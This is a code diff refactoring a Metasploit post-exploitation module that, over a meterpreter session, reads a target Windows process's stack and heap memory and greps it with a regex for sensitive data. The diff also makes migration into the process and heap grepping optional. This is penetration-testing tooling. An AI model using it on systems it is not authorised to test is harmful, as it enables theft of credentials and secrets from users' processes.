@@ -14,9 +14,10 @@ class Metasploit3 < Msf::Post
 			'Name'           => 'Windows Gather Process Memory Grep',
 			'Description'    => %q{
 					This module allows for searching the memory space of a proccess for potentially
-				sensitive data.  Please note: This module will have to migrate to the process you
-				are grepping, and will not migrate back automatically.  This means that if the user
-				terminates the application after using this module, you may lose your session.
+				sensitive data.  Please note: When the HEAP option is enabled, the module will have
+				to migrate to the process you are grepping, and will not migrate back automatically.
+				This means that if the user terminates the application after using this module, you
+				may lose your session.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => ['bannedit'],
@@ -24,23 +25,14 @@ class Metasploit3 < Msf::Post
 			'SessionTypes'   => ['meterpreter' ]
 		))
 		register_options([
-			OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
-			OptRegexp.new('REGEX',   [true, 'Regular expression to search for with in memory', nil])
+			OptString.new('PROCESS', [true,  'Name of the process to dump memory from', nil]),
+			OptRegexp.new('REGEX',   [true,  'Regular expression to search for with in memory', nil]),
+			OptBool.new('HEAP',      [false, 'Grep from heap', false])
 		], self.class)
 	end
 
-	def dump_data(target_pid)
-		# we need to be inside the process to walk the heap using railgun
-		current = client.sys.process.getpid
-		if target_pid != current
-			print_status("Migrating into #{target_pid} to allow for dumping heap data")
-			session.core.migrate(target_pid)
-		end
-
-		regex = datastore['REGEX']
+	def get_data_from_stack(proc)
 		stack = []
-		proc = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
-
 		begin
 			threads = proc.thread.each_thread do |tid|
 				thread = proc.thread.open(tid)
@@ -49,16 +41,27 @@ class Metasploit3 < Msf::Post
 				vprint_status("Found Thread TID: #{tid}\tBaseAddress: 0x%08x\t\tRegionSize: %d bytes" % [addr['BaseAddress'], addr['RegionSize']])
 				data = proc.memory.read(addr['BaseAddress'], addr['RegionSize'])
 				stack << {
-							'Address' => addr['BaseAddress'],
-							'Size' => addr['RegionSize'],
-							'Handle' => thread.handle,
-							'Data' => data
-						}
-					end
+					'Address' => addr['BaseAddress'],
+					'Size' => addr['RegionSize'],
+					'Handle' => thread.handle,
+					'Data' => data
+				}
+			end
 		rescue
 		end
 
+		stack
+	end
+
+	def get_data_from_heap(proc, target_pid)
+		# we need to be inside the process to walk the heap using railgun
+		current = client.sys.process.getpid
 		heap = []
+		if target_pid != current
+			print_status("Migrating into #{target_pid} to allow for dumping heap data")
+			session.core.migrate(target_pid)
+		end
+
 		railgun = session.railgun
 		heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
 		dheap = railgun.kernel32.GetProcessHeap()['return']
@@ -95,26 +98,39 @@ class Metasploit3 < Msf::Post
 			end
 		end
 
-		matches = []
-		stack.each do |mem|
+		heap
+	end
+
+	def dump_data(target_pid)
+		regex = datastore['REGEX']
+		proc  = client.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
+
+
+		get_data_from_stack(proc).each do |mem|
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
 				print_status("Match found on stack!")
 				print_line
 				data = mem['Data'][idx, 512]
-				print_line(Rex::Text.to_hex_dump(data))
+				addr = mem['Address'] + idx
+				print_line(Rex::Text.to_hex_dump(data, 16, addr))
 			end
 		end
 
-		heap.each do |mem|
+		# Grep from heap is optional.  If the 'HEAP' option isn't set,
+		# then let's bail.
+		return unless datastore['HEAP']
+
+		get_data_from_heap(proc, target_pid).each do |mem|
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
 				print_status("Match found on heap!")
 				print_line
 				data = mem['Data'][idx, 512]
-				print_line(Rex::Text.to_hex_dump(data))
+				addr = mem['Address'] + idx
+				print_line(Rex::Text.to_hex_dump(data, 16, addr))
 			end
 		end
 	end
